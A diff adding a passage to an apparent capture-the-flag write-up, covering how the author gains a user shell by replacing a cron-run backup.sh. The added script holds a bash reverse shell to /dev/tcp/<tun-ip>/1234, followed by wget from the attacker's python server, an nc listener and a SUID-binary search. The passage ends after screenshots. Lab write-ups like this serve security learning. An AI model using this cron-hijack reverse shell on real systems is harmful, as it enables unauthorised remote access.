@@ -218,6 +218,101 @@ Let's find out user.txt flag
 
 we need to find a way to be the user that owns the file to read it.
 
+While enumarating the system as www-data i decided to inspect the crontab file for any intersting way to be ploat_admin.
+
+The results:
+
+
+![image](https://cdn-images-1.medium.com/max/1000/1*yRZbwqu-YtMsggZy2P7n8A.png)
+
+
+There is a way to that because this user runs the file as scheduald command on the system. Maybe can we modified it
+to achive the goal.
+
+we can not modified it, but we have writing permission within the directory so we need to write a new backup.sh script that includes reverse shell payload to get a shell as plot_admin. First, delete the old backup.sh file and create a new one. 
+
+so the new backup.sh includs:
+
+```
+#!/bin/bash
+/bin/sh -i >& /dev/tcp/<tun-ip>/1234 0>&1
+
+```
+
+After create it on your machine you nedd to upload it to the victim machine with python server:
+
+```
+on your nachine, open the server with this command inside the directory that includs the backup.sh file:
+
+python3 -m http.server
+
+on victim machine use wget to upload the file into it:
+
+wget http://<your-ip>:8000/backup.sh
+
+```
+
+The next step will be give it execute permission with:
+
+```
+chmod +x backup.sh
+```
+
+
+On your machine set netcat listener to achive shell as ploted_admin:
+
+```
+nc -lnvp 1234
+```
+
+and now wait to file running automatically by the crontab.
+
+there is a shell:
+
+![image](https://cdn-images-1.medium.com/max/1000/1*L89p1gsoQtF6fW9Gl8LnOQ.png)
+
+cat /home/plot_admin/user.txt flag.
+
+
+***Privilege escalation:*
+
+let's find out if there are any binary that can help us:
+
+```
+find / -user root -perm /4000 2>/dev/null
+```
+
+![image](https://cdn-images-1.medium.com/max/1000/1*vqnteGcIrwt54GfUy9MfoQ.png)
+
+
+
+![image](https://cdn-images-1.medium.com/max/1000/1*de_my2WXS1upQLlGFRzuFQ.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
